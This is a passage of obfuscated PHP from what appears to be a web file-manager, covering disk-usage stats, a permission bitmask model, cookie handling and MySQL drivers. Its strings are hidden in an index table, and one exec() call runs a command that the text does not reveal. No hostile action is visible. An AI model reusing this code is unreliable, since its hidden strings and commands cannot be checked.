$ğ°ç¡Œ›[1997] => (int) $±úã¸†», $ğ°ç¡Œ›[1998] => ucfirst($Üº½”Û), $ğ°ç¡Œ›[1999] => $ğ°ç¡Œ›[2000] . PHP_VERSION, $ğ°ç¡Œ›[2001] => phpBuild64() ? 64 : 32, $ğ°ç¡Œ›[848] => str_replace($ğ°ç¡Œ›[1236], $ğ°ç¡Œ›[1096], $ŞŒŠ”œÜ), $ğ°ç¡Œ›[427] => ucfirst($¤¡šßº), $ğ°ç¡Œ›[32] => $_SERVER[$ğ°ç¡Œ›[2002]]); } private function diskDriver() { $±•‚ÍâÌ =& $_SERVER[ÓïÕü]; $å¡à˜¨ = $±•‚ÍâÌ[8]; $„Ã“¹¥Õ = $GLOBALS[$±•‚ÍâÌ[6]][$±•‚ÍâÌ[1420]] == $±•‚ÍâÌ[1421]; if ($„Ã“¹¥Õ) { $å¡à˜¨ = $±•‚ÍâÌ[2003]; if (function_exists($±•‚ÍâÌ[2004])) { exec($±•‚ÍâÌ[2005], $®ÁíÂ†â); $å¡à˜¨ = $®ÁíÂ†â[1] . $±•‚ÍâÌ[8]; } } if (!file_exists($å¡à˜¨)) { return; } if (!function_exists($±•‚ÍâÌ[2006])) { return; } $ŠÈéé§ç = @disk_total_space($å¡à˜¨); $è‡şÂË‡ = $ŠÈéé§ç - @disk_free_space($å¡à˜¨); return array($±•‚ÍâÌ[1993] => $ŠÈéé§ç, $±•‚ÍâÌ[1995] => $è‡şÂË‡); } public function fileChart($ƒËÖçÒõ) { $½ˆœÖ¢ù =& $_SERVER[ÓïÕü]; if (isset($ƒËÖçÒõ[$½ˆœÖ¢ù[1806]])) { return Model($½ˆœÖ¢ù[921])->userFileTypeProfile($ƒËÖçÒõ[$½ˆœÖ¢ù[1806]]); } if (isset($ƒËÖçÒõ[$½ˆœÖ¢ù[1418]])) { return Model($½ˆœÖ¢ù[921])->groupFileTypeProfile($ƒËÖçÒõ[$½ˆœÖ¢ù[1418]]); } $ª¬Æü½Â = $this->sourceSize(); $‹ß“Î™¼ = array($½ˆœÖ¢ù[193] => 0, $½ˆœÖ¢ù[191] => 1); $î²ŸŒÍ = Model($½ˆœÖ¢ù[921])->where($‹ß“Î™¼)->sum($½ˆœÖ¢ù[79]); $‹ß“Î™¼[$½ˆœÖ¢ù[191]] = 2; $Ñ½é¯Üœ = Model($½ˆœÖ¢ù[921])->where($‹ß“Î™¼)->sum($½ˆœÖ¢ù[79]); return array($½ˆœÖ¢ù[854] => $ª¬Æü½Â[$½ˆœÖ¢ù[79]], $½ˆœÖ¢ù[1940] => $ª¬Æü½Â[$½ˆœÖ¢ù[1940]], $½ˆœÖ¢ù[1941] => (int) $î²ŸŒÍ, $½ˆœÖ¢ù[1942] => (int) $Ñ½é¯Üœ); } private function sourceSize() { $ŞığÉ« =& $_SERVER[ÓïÕü]; $¿„ÒÓÌÑ = Model($ŞığÉ«[921])->where(array($ŞığÉ«[488] => 0))->sum($ŞığÉ«[79]); $™šÅœ–‘ = Model($ŞığÉ«[549])->sum($ŞığÉ«[79]); if ($™šÅœ–‘ > $¿„ÒÓÌÑ) { $™šÅœ–‘ = $¿„ÒÓÌÑ; } return array($ŞığÉ«[79] => (int) $¿„ÒÓÌÑ, $ŞığÉ«[1940] => (int) $™šÅœ–‘); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ú‚”×Õ´ =& $_SERVER[ÓïÕü]; $ÅËÆíìÇ = array(array($ú‚”×Õ´[497] => LNG($ú‚”×Õ´[2007]), $ú‚”×Õ´[2008] => $ú‚”×Õ´[2009], $ú‚”×Õ´[2010] => 1, $ú‚”×Õ´[2011] => 1, $ú‚”×Õ´[2012] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ú‚”×Õ´[497] => LNG($ú‚”×Õ´[2013]), $ú‚”×Õ´[2008] => $ú‚”×Õ´[2014], $ú‚”×Õ´[2010] => 2, $ú‚”×Õ´[2011] => 1, $ú‚”×Õ´[2012] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ú‚”×Õ´[497] => LNG($ú‚”×Õ´[2015]), $ú‚”×Õ´[2008] => $ú‚”×Õ´[2016], $ú‚”×Õ´[2010] => 3, $ú‚”×Õ´[2011] => 1, $ú‚”×Õ´[2012] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ú‚”×Õ´[497] => LNG($ú‚”×Õ´[2017]), $ú‚”×Õ´[2008] => $ú‚”×Õ´[2018], $ú‚”×Õ´[2010] => 4, $ú‚”×Õ´[2011] => 1, $ú‚”×Õ´[2012] => self::AUTH_SHOW | self::AUTH_VIEW), array($ú‚”×Õ´[497] => LNG($ú‚”×Õ´[2019]), $ú‚”×Õ´[2008] => $ú‚”×Õ´[2020], $ú‚”×Õ´[2010] => 5, $ú‚”×Õ´[2011] => 1, $ú‚”×Õ´[2012] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ú‚”×Õ´[497] => LNG($ú‚”×Õ´[2021]), $ú‚”×Õ´[2008] => $ú‚”×Õ´[2022], $ú‚”×Õ´[2010] => 6, $ú‚”×Õ´[2011] => 1, $ú‚”×Õ´[2012] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ú‚”×Õ´[497] => LNG($ú‚”×Õ´[2023]), $ú‚”×Õ´[2008] => $ú‚”×Õ´[2024], $ú‚”×Õ´[2010] => 7, $ú‚”×Õ´[2011] => 1, $ú‚”×Õ´[2012] => 0)); return $ÅËÆíìÇ; } public static function authCheck($¬ÅÚ¹Ó, $ë‡‹¯š) { $’¼Ê ò“ =& $_SERVER[ÓïÕü]; $¬ÅÚ¹Ó = intval($¬ÅÚ¹Ó); if (KodUser::isRoot() && $GLOBALS[$’¼Ê ò“[6]][$’¼Ê ò“[2025]]) { return !0; } if ($¬ÅÚ¹Ó <= 0) { return !1; } if (($¬ÅÚ¹Ó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($¬ÅÚ¹Ó & $ë‡‹¯š); } public static function authCheckShow($í¹ÕæÙ) { return self::authCheck($í¹ÕæÙ, self::AUTH_SHOW); } public static function authCheckView($“º÷ÕÇİ) { return self::authCheck($“º÷ÕÇİ, self::AUTH_VIEW); } public static function authCheckDownload($—Û•öå©) { return self::authCheck($—Û•öå©, self::AUTH_DOWNLOAD); } public static function authCheckUpload($”êÇìÇŒ) { return self::authCheck($”êÇìÇŒ, self::AUTH_UPLOAD); } public static function authCheckEdit($¯¡·ÓÁ) { return self::authCheck($¯¡·ÓÁ, self::AUTH_EDIT); } public static function authCheckRemove($İÓ¿¨®Ç) { return self::authCheck($İÓ¿¨®Ç, self::AUTH_REMOVE); } public static function authCheckShare($Ô¹˜Õ¼ù) { return self::authCheck($Ô¹˜Õ¼ù, self::AUTH_SHARE); } public static function authCheckComment($§Û Ëá) { return self::authCheck($§Û Ëá, self::AUTH_COMMENT); } public static function authCheckEvent($ñœÜ¤şê) { return self::authCheck($ñœÜ¤şê, self::AUTH_EVENT); } public static function authCheckRoot($áåÊøÃ™) { return self::authCheck($áåÊøÃ™, self::AUTH_ROOT); } public static function authCheckAction($£ƒß›ëã, $îú¤¯õ) { $º¡ Ëæº =& $_SERVER[ÓïÕü]; $ó‘µ¥“ = array($º¡ Ëæº[2026] => self::AUTH_VIEW, $º¡ Ëæº[1307] => self::AUTH_DOWNLOAD, $º¡ Ëæº[110] => self::AUTH_UPLOAD, $º¡ Ëæº[1976] => self::AUTH_EDIT, $º¡ Ëæº[1975] => self::AUTH_REMOVE, $º¡ Ëæº[1986] => self::AUTH_SHARE, $º¡ Ëæº[432] => self::AUTH_COMMENT, $º¡ Ëæº[1793] => self::AUTH_EVENT, $º¡ Ëæº[2027] => self::AUTH_ROOT); if (!isset($ó‘µ¥“[$îú¤¯õ])) { return; } $Å€ªµ÷È = $ó‘µ¥“[$îú¤¯õ]; $£ƒß›ëã = intval($£ƒß›ëã); if ($£ƒß›ëã <= 0) { return !1; } if (($£ƒß›ëã & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($£ƒß›ëã & $Å€ªµ÷È); } public static function authDisable($¿Ê¼›Óİ, $ñ˜³‡òÊ) { if (intval($¿Ê¼›Óİ) <= 0) { return 0; } return intval($¿Ê¼›Óİ) & ~$ñ˜³‡òÊ; } public $optionType = "\123\171\163\164\145\x6d\56\x73\157\165\x72\143\x65\x41\x75\x74\x68\114\151\x73\164"; public $field = array("\x6e\141\x6d\x65", "\141\x75\164\x68", "\x6c\141\x62\x65\154", "\x64\x69\x73\160\x6c\x61\171", "\x73\171\x73\x74\x65\x6d", "\163\157\x72\x74"); public function initData() { $ˆñÔæ¿ê = $this->authDefault(); foreach ($ˆñÔæ¿ê as $ƒ¥ÅÖÚƒ) { $this->add($ƒ¥ÅÖÚƒ); } } public function findAuth($Ãíˆ®³Ç, $Û©‹ê¸Ù) { $‚©ˆ×ßÎ =& $_SERVER[ÓïÕü]; $û¡ä™¨¤ = parent::listData(); foreach ($û¡ä™¨¤ as $¦˜¤ßÏ) { $Î­¢øÛğ = intval($¦˜¤ßÏ[$‚©ˆ×ßÎ[490]]); if ($Î­¢øÛğ <= 0 || $¦˜¤ßÏ[$‚©ˆ×ßÎ[2028]] == 0) { continue; } if (($Î­¢øÛğ & $Ãíˆ®³Ç) != $Ãíˆ®³Ç) { continue; } if (($Î­¢øÛğ & $Û©‹ê¸Ù) != 0) { continue; } return $¦˜¤ßÏ[$‚©ˆ×ßÎ[478]]; } return !1; } public function findAuthMax($ŠÙÑäÈæ, $¤ÔşÌû) { $şâı¥»« =& $_SERVER[ÓïÕü]; $¹¹®şı = !1; $ÅËÛÚÇÛ = parent::listData(); foreach ($ÅËÛÚÇÛ as $Ïèğ½) { $€É‘¦ó‰ = intval($Ïèğ½[$şâı¥»«[490]]); if ($€É‘¦ó‰ <= 0 || $Ïèğ½[$şâı¥»«[2028]] == 0) { continue; } if (($€É‘¦ó‰ & $ŠÙÑäÈæ) != $ŠÙÑäÈæ) { continue; } if (($€É‘¦ó‰ & $¤ÔşÌû) != 0) { continue; } if (!$¹¹®şı) { $¹¹®şı = $Ïèğ½; continue; } if (intval($¹¹®şı[$şâı¥»«[490]]) < $€É‘¦ó‰) { $¹¹®şı = $Ïèğ½; } } return $¹¹®şı ? $¹¹®şı[$şâı¥»«[478]] : !1; } public function findAuthReadOnly() { $Ã¦¡Ã¨¥ = self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD; $Üöó¡õ = self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE; return $this->findAuth($Ã¦¡Ã¨¥, $Üöó¡õ); } public function findAuthNotRead() { return $this->findAuth(0, self::AUTH_SHOW); } public function findAuthMinDefault() { $Ù‚Éæóô =& $_SERVER[ÓïÕü]; $¿Ğòš™® = parent::listData(); $Å•Ç¡³Ó = !1; foreach ($¿Ğòš™® as $ôèèÄ) { if ($ôèèÄ[$Ù‚Éæóô[490]] <= 0 || $ôèèÄ[$Ù‚Éæóô[2028]] == $Ù‚Éæóô[231]) { continue; } if (!$Å•Ç¡³Ó) { $Å•Ç¡³Ó = $ôèèÄ; continue; } if ($Å•Ç¡³Ó[$Ù‚Éæóô[490]] > $ôèèÄ[$Ù‚Éæóô[490]]) { $Å•Ç¡³Ó = $ôèèÄ; } } return $Å•Ç¡³Ó ? $Å•Ç¡³Ó[$Ù‚Éæóô[478]] : $Ù‚Éæóô[12]; } public function listData($ˆıÃµ™‚ = false, $¤ˆ¿“ô± = "\163\x6f\x72\164", $•¤ß´ŒÇ = false) { return parent::listData($ˆıÃµ™‚, $¤ˆ¿“ô±, $•¤ß´ŒÇ); } public function update($É¾»¼áş, $§Ù—îÖ«) { $Ùó°À¡ß =& $_SERVER[ÓïÕü]; $¤ó–¸œµ = parent::listData($É¾»¼áş); $Ÿ°íãÛÂ = $this->findByName($§Ù—îÖ«[$Ùó°À¡ß[32]]); if (!$¤ó–¸œµ || $Ÿ°íãÛÂ && $Ÿ°íãÛÂ[$Ùó°À¡ß[478]] != $¤ó–¸œµ[$Ùó°À¡ß[478]]) { return !1; } $this->filterAuth($§Ù—îÖ«[$Ùó°À¡ß[490]]); return parent::update($É¾»¼áş, $§Ù—îÖ«); } public function remove($×‘×„õ) { $…Ş¬ÕÑæ = parent::listData($×‘×„õ); if (!$…Ş¬ÕÑæ || $…Ş¬ÕÑæ[$_SERVER[ÓïÕü][192]]) { return !1; } return parent::remove($×‘×„õ); } public function add($çÁääæ = array()) { $¾ÃƒÙøÜ =& $_SERVER[ÓïÕü]; if ($this->findByName($çÁääæ[$¾ÃƒÙøÜ[32]])) { return !1; } $ûî…ì€è = array($¾ÃƒÙøÜ[32] => $¾ÃƒÙøÜ[12], $¾ÃƒÙøÜ[490] => 1, $¾ÃƒÙøÜ[2029] => $¾ÃƒÙøÜ[2016], $¾ÃƒÙøÜ[2028] => 1, $¾ÃƒÙøÜ[192] => 0, $¾ÃƒÙøÜ[2030] => 0); $çÁääæ = array_merge($ûî…ì€è, $çÁääæ); $çÁääæ[$¾ÃƒÙøÜ[2030]] = $this->getSort(); $this->filterAuth($çÁääæ[$¾ÃƒÙøÜ[490]]); return parent::insert($çÁääæ); } private function getSort() { $¬ÇŸí»Ó =& $_SERVER[ÓïÕü]; $æİş‹êñ = parent::listData(); $¾¾œ´û = array_to_keyvalue($æİş‹êñ, $¬ÇŸí»Ó[12], $¬ÇŸí»Ó[2030]); return empty($¾¾œ´û) ? 0 : max($¾¾œ´û) + 1; } private function filterAuth(&$œ€µÔÚó) { if (!$œ€µÔÚó) { return; } $’Ãæ¾áï = array(self::AUTH_SHOW, self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT, self::AUTH_REMOVE, self::AUTH_SHARE, self::AUTH_COMMENT, self::AUTH_EVENT, self::AUTH_ROOT); $àÑîÊÖ¾ = array(); foreach ($’Ãæ¾áï as $”©˜Ññ²) { if ($œ€µÔÚó & $”©˜Ññ²) { $àÑîÊÖ¾[] = $”©˜Ññ²; } } if (in_array(self::AUTH_ROOT, $àÑîÊÖ¾)) { $œ€µÔÚó = array_sum($’Ãæ¾áï); return; } $€ÌØ‚¬Ô = array(self::AUTH_DOWNLOAD => array(self::AUTH_VIEW), self::AUTH_EDIT => array(self::AUTH_VIEW), self::AUTH_REMOVE => array(self::AUTH_EDIT), self::AUTH_SHARE => array(self::AUTH_VIEW, self::AUTH_DOWNLOAD, self::AUTH_UPLOAD, self::AUTH_EDIT)); foreach ($àÑîÊÖ¾ as $”©˜Ññ²) { if (isset($€ÌØ‚¬Ô[$”©˜Ññ²])) { $àÑîÊÖ¾ = array_merge($àÑîÊÖ¾, $€ÌØ‚¬Ô[$”©˜Ññ²]); } } $àÑîÊÖ¾[] = self::AUTH_SHOW; $œ€µÔÚó = array_sum(array_unique($àÑîÊÖ¾)); } public function sort($Ôïí²¡ò, $ùÚÍ¸ë) { return parent::update($Ôïí²¡ò, $ùÚÍ¸ë); } } goto bØã’Öò¸º; fÑ’§¨óĞí: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($áÌŒ³¤ø = '', $ØÊ•½œ– = 0) { if (is_string($áÌŒ³¤ø) && $áÌŒ³¤ø != $_SERVER[ÓïÕü][12]) { $this->prefix = $áÌŒ³¤ø; } if (is_numeric($ØÊ•½œ–) && $ØÊ•½œ– > 0) { $this->expire = $ØÊ•½œ–; } } public static function getInstance() { static $™ì—Ÿ‹à; if ($™ì—Ÿ‹à === null) { $™ì—Ÿ‹à = new self(); } return $™ì—Ÿ‹à; } private static $cookieDisable = false; public static function disable($¨•šÕß¸) { self::$cookieDisable = $¨•šÕß¸; } private static $sameCookieSet = array(); public static function set($Ø®Å‚ğ, $­±­âŞ, $…¤ç˜À = 0, $ĞÆûü¶¶ = false, $Õ§Ë„•ˆ = false) { $ÇÂİÉĞ€ =& $_SERVER[ÓïÕü]; if (self::$cookieDisable) { return; } if (!$…¤ç˜À) { $…¤ç˜À = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$Ø®Å‚ğ]) && self::$sameCookieSet[$Ø®Å‚ğ] == $­±­âŞ . $…¤ç˜À) { return; } self::$sameCookieSet[$Ø®Å‚ğ] = $­±­âŞ . $…¤ç˜À; if (!$Õ§Ë„•ˆ) { $Õ§Ë„•ˆ = str_replace(HOST, $ÇÂİÉĞ€[12], APP_HOST); $Õ§Ë„•ˆ = _get($GLOBALS, $ÇÂİÉĞ€[987], $Õ§Ë„•ˆ); } $µøÑÖº¼ = $ÇÂİÉĞ€[12]; setcookie($Ø®Å‚ğ, $­±­âŞ, time() + $…¤ç˜À, $ÇÂİÉĞ€[8] . trim($Õ§Ë„•ˆ, $ÇÂİÉĞ€[8]) . $µøÑÖº¼, !1, !1, $ĞÆûü¶¶); } public static function setSafe($…±¼”, $äÂÄ•Ê, $àÏ£ëÏø = 0) { self::set($…±¼”, $äÂÄ•Ê, $àÏ£ëÏø, !0); } public static function get($³æİ¡Òõ) { static $ë™¯ç»Œ = false; if (!$ë™¯ç»Œ) { self::initHeaderCookie(); $ë™¯ç»Œ = !0; } return isset($_COOKIE[$³æİ¡Òõ]) ? $_COOKIE[$³æİ¡Òõ] : !1; } private static function initHeaderCookie() { $˜¾ƒ½ÕË =& $_SERVER[ÓïÕü]; if (!isset($_SERVER[$˜¾ƒ½ÕË[988]]) || !$_SERVER[$˜¾ƒ½ÕË[988]]) { return; } $‹‹ØÇ§§ = explode($˜¾ƒ½ÕË[74], $_SERVER[$˜¾ƒ½ÕË[988]]); foreach ($‹‹ØÇ§§ as $ø„œ¬ş) { $ø„œ¬ş = explode($˜¾ƒ½ÕË[509], $ø„œ¬ş); if (count($ø„œ¬ş) != 2 || !isset($ø„œ¬ş[1])) { continue; } $_COOKIE[trim($ø„œ¬ş[0])] = trim($ø„œ¬ş[1]); } } public static function remove($ìïŸ…‹Ä, $ÍÙ«åŒü = false) { unset($_COOKIE[$ìïŸ…‹Ä]); self::set($ìïŸ…‹Ä, $_SERVER[ÓïÕü][12], 1, $ÍÙ«åŒü); } } class DbMysql extends Db { public function __construct($®’¶ãÃ˜ = '') { $¨âÌù¨É =& $_SERVER[ÓïÕü]; if (!extension_loaded($¨âÌù¨É[899])) { think_exception(think_lang($¨âÌù¨É[14]) . $¨âÌù¨É[989]); } if (!empty($®’¶ãÃ˜)) { $this->config = $®’¶ãÃ˜; if (empty($this->config[$¨âÌù¨É[17]])) { $this->config[$¨âÌù¨É[17]] = $¨âÌù¨É[12]; } } } public function connect($ì®õ„¤÷ = '', $†›­à’ô = 0, $Ğú–§ñÜ = false) { $Æ¦ú¦‡ª =& $_SERVER[ÓïÕü]; if (!isset($this->linkID[$†›­à’ô])) { if (empty($ì®õ„¤÷)) { $ì®õ„¤÷ = $this->config; } $’²ãô“ = $ì®õ„¤÷[$Æ¦ú¦‡ª[990]] . ($ì®õ„¤÷[$Æ¦ú¦‡ª[991]] ? "\72{$ì®õ„¤÷[$Æ¦ú¦‡ª[991]]}" : $Æ¦ú¦‡ª[12]); $™èÈŸ¼› = !empty($ì®õ„¤÷[$Æ¦ú¦‡ª[17]][$Æ¦ú¦‡ª[18]]) ? $ì®õ„¤÷[$Æ¦ú¦‡ª[17]][$Æ¦ú¦‡ª[18]] : $this->pconnect; if ($™èÈŸ¼›) { $this->linkID[$†›­à’ô] = mysql_pconnect($’²ãô“, $ì®õ„¤÷[$Æ¦ú¦‡ª[992]], $ì®õ„¤÷[$Æ¦ú¦‡ª[993]], 131072); } else { $this->linkID[$†›­à’ô] = mysql_connect($’²ãô“, $ì®õ„¤÷[$Æ¦ú¦‡ª[992]], $ì®õ„¤÷[$Æ¦ú¦‡ª[993]], !0, 131072); } if (!$this->linkID[$†›­à’ô] || !empty($ì®õ„¤÷[$Æ¦ú¦‡ª[21]]) && !mysql_select_db($ì®õ„¤÷[$Æ¦ú¦‡ª[21]], $this->linkID[$†›­à’ô])) { think_exception(mysql_error()); } $Òîù×ó° = mysql_get_server_info($this->linkID[$†›­à’ô]); mysql_query($Æ¦ú¦‡ª[994] . think_config($Æ¦ú¦‡ª[995]) . $Æ¦ú¦‡ª[58], $this->linkID[$†›­à’ô]); if ($Òîù×ó° > $Æ¦ú¦‡ª[996]) { mysql_query($Æ¦ú¦‡ª[997], $this->linkID[$†›­à’ô]); } $this->connected = !0; if (1 != think_config($Æ¦ú¦‡ª[22])) { unset($this->config); } } return $this->linkID[$†›­à’ô]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($‹’øêèÕ) { $‹ß§…–˜ =& $_SERVER[ÓïÕü]; if (0 === stripos($‹’øêèÕ, $‹ß§…–˜[344])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $‹’øêèÕ; if ($this->queryID) { $this->free(); } think_action_status($‹ß§…–˜[23], 1); think_status($‹ß§…–˜[24]); $this->queryID = mysql_query($‹’øêèÕ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($¯¹”Ø»ˆ) { $÷íŞäŞ€ =& $_SERVER[ÓïÕü]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $¯¹”Ø»ˆ; if ($this->queryID) { $this->free(); } think_action_status($÷íŞäŞ€[25], 1); think_status($÷íŞäŞ€[24]); $ÎÜğêÃ = mysql_query($¯¹”Ø»ˆ, $this->_linkID); $this->debug(); if (!1 === $ÎÜğêÃ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ÓïÕü][998], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $­Ÿ·ú™¨ = mysql_query($_SERVER[ÓïÕü][999], $this->_linkID); $this->transTimes = 0; if (!$­Ÿ·ú™¨) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Š°¢¡ú = mysql_query($_SERVER[ÓïÕü][1000], $this->_linkID); $this->transTimes = 0; if (!$Š°¢¡ú) { $this->error(); return !1; } } return !0; } private function getAll() { $ãúÓëæ– = array(); if ($this->numRows > 0) { while ($á­™Ï¬é = mysql_fetch_assoc($this->queryID)) { $ãúÓëæ–[] = $á­™Ï¬é; } mysql_data_seek($this->queryID, 0); } return $ãúÓëæ–; } public function getFields($×÷ÅşÅ) { $šŒûÏğú =& $_SERVER[ÓïÕü]; $óıÂ­Áî = $this->query($šŒûÏğú[1001] . $this->parseKey($×÷ÅşÅ)); $–™ÜÅ¨á = array(); if ($óıÂ­Áî) { foreach ($óıÂ­Áî as $œğçİ¸ô => $Å÷²ÀÈ) { $–™ÜÅ¨á[$Å÷²ÀÈ[$šŒûÏğú[31]]] = array($šŒûÏğú[32] => $Å÷²ÀÈ[$šŒûÏğú[31]], $šŒûÏğú[33] => $Å÷²ÀÈ[$šŒûÏğú[34]], $šŒûÏğú[35] => (bool) (strtoupper($Å÷²ÀÈ[$šŒûÏğú[36]]) === $šŒûÏğú[1002]), $šŒûÏğú[37] => $Å÷²ÀÈ[$šŒûÏğú[38]], $šŒûÏğú[39] => strtolower($Å÷²ÀÈ[$šŒûÏğú[40]]) == $šŒûÏğú[41], $šŒûÏğú[42] => strtolower($Å÷²ÀÈ[$šŒûÏğú[43]]) == $šŒûÏğú[44]); } } return $–™ÜÅ¨á; } public function getTables($ÊÓ¬ÍŒş = '') { $èò‡€Öµ =& $_SERVER[ÓïÕü]; if (!empty($ÊÓ¬ÍŒş)) { $ó¯Öé†± = $èò‡€Öµ[1003] . $ÊÓ¬ÍŒş . $èò‡€Öµ[1004]; } else { $ó¯Öé†± = $èò‡€Öµ[1005]; } $Ä °Œğ› = $this->query($ó¯Öé†±); $ëíñÇê… = array(); foreach ($Ä °Œğ› as $¦¸ŒƒÁ => $üûŸŞÖì) { $ëíñÇê…[$¦¸ŒƒÁ] = current($üûŸŞÖì); } return $ëíñÇê…; } public function replace($î±¨™æš, $ÅÇÀÆ¢å = array()) { $’Şë’ëŞ =& $_SERVER[ÓïÕü]; foreach ($î±¨™æš as $ş†úÖÅ => $ø ¶üƒ±) { $¥¸öâŒ› = $this->parseValue($ø ¶üƒ±); if (is_scalar($¥¸öâŒ›)) { $å¥¬ÃÄ[] = $¥¸öâŒ›; $Üûˆè[] = $this->parseKey($ş†úÖÅ); } } $ÎèĞ‚íÜ = $’Şë’ëŞ[1006] . $this->parseTable($ÅÇÀÆ¢å[$’Şë’ëŞ[359]]) . $’Şë’ëŞ[1007] . implode($’Şë’ëŞ[50], $Üûˆè) . $’Şë’ëŞ[1008] . implode($’Şë’ëŞ[50], $å¥¬ÃÄ) . $’Şë’ëŞ[1009]; return $this->execute($ÎèĞ‚íÜ); } public function insertAll($˜æŒÜÌ¸, $—˜‰°¨ = array(), $Œ¸®€§ = false) { $úÀâ·Ç² =& $_SERVER[ÓïÕü]; if (!is_array($˜æŒÜÌ¸[0])) { return !1; } $°’ƒÒ˜¶ = array_keys($˜æŒÜÌ¸[0]); $˜Ê¶Ä»– = array(); foreach ($˜æŒÜÌ¸ as $©˜”ïÂ÷) { $§®¸ãäÆ = array(); foreach ($©˜”ïÂ÷ as $’ÄšÄï => $ô“â¶ºƒ) { $ô“â¶ºƒ = $this->parseValue($ô“â¶ºƒ); if (is_scalar($ô“â¶ºƒ)) { $§®¸ãäÆ[] = $ô“â¶ºƒ; } } $˜Ê¶Ä»–[] = $úÀâ·Ç²[340] . implode($úÀâ·Ç²[50], $§®¸ãäÆ) . $úÀâ·Ç²[1009]; } array_walk($°’ƒÒ˜¶, array($this, $úÀâ·Ç²[1010])); $•éóŞ“¯ = ($Œ¸®€§ ? $úÀâ·Ç²[1011] : $úÀâ·Ç²[1012]) . $úÀâ·Ç²[1013] . $this->parseTable($—˜‰°¨[$úÀâ·Ç²[359]]) . $úÀâ·Ç²[1007] . implode($úÀâ·Ç²[50], $°’ƒÒ˜¶) . $úÀâ·Ç²[1014] . implode($úÀâ·Ç²[50], $˜Ê¶Ä»–); return $this->execute($•éóŞ“¯); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $‰ÃÒë÷¤ =& $_SERVER[ÓïÕü]; $this->error = mysql_errno() . $‰ÃÒë÷¤[4] . mysql_error($this->_linkID); if ($‰ÃÒë÷¤[12] != $this->queryStr) { $this->error .= LNG($‰ÃÒë÷¤[48]) . $this->queryStr; } think_trace($this->error, $‰ÃÒë÷¤[12], $‰ÃÒë÷¤[49]); return $this->error; } public function escapeString($´Êè‹Ğë) { if ($this->_linkID) { return mysql_real_escape_string($´Êè‹Ğë, $this->_linkID); } else { return mysql_escape_string($´Êè‹Ğë); } } public function parseKey(&$ìâî¤æ, $ÛÔ›€ØŸ = true) { $è‘ğ¬Š =& $_SERVER[ÓïÕü]; if ($ÛÔ›€ØŸ) { $ìâî¤æ = $this->parseKeyCheck($ìâî¤æ); } if ($ìâî¤æ != $è‘ğ¬Š[223] && !preg_match($è‘ğ¬Š[1015], $ìâî¤æ)) { $ìâî¤æ = $è‘ğ¬Š[464] . trim($ìâî¤æ, $è‘ğ¬Š[464]) . $è‘ğ¬Š[464]; } return $ìâî¤æ; } } class DbMysqli extends Db { public function __construct($‡‹®šŞ = '') { $ ¸ÇÇš³ =& $_SERVER[ÓïÕü]; if (!extension_loaded($ ¸ÇÇš³[1016])) { think_exception(think_lang($ ¸ÇÇš³[14]) . $ ¸ÇÇš³[1017]); } if (!empty($‡‹®šŞ)) { $this->config = $‡‹®šŞ; if (empty($this->config[$ ¸ÇÇš³[17]])) { $this->config[$ ¸ÇÇš³[17]] = $ ¸ÇÇš³[12]; } } } public function connect($´ÒöìÈ¦ = '', $‹£¸ş§ = 0) { $ÓİºãğÀ =& $_SERVER[ÓïÕü]; if (!isset($this->linkID[$‹£¸ş§])) { if (empty($´ÒöìÈ¦)) { $´ÒöìÈ¦ = $this->config; } $this->linkID[$‹£¸ş§] = new mysqli($´ÒöìÈ¦[$ÓİºãğÀ[990]], $´ÒöìÈ¦[$ÓİºãğÀ[992]], $´ÒöìÈ¦[$ÓİºãğÀ[993]], $´ÒöìÈ¦[$ÓİºãğÀ[21]], $´ÒöìÈ¦[$ÓİºãğÀ[991]] ? intval($´ÒöìÈ¦[$ÓİºãğÀ[991]]) : 3306); if (mysqli_connect_errno()) { 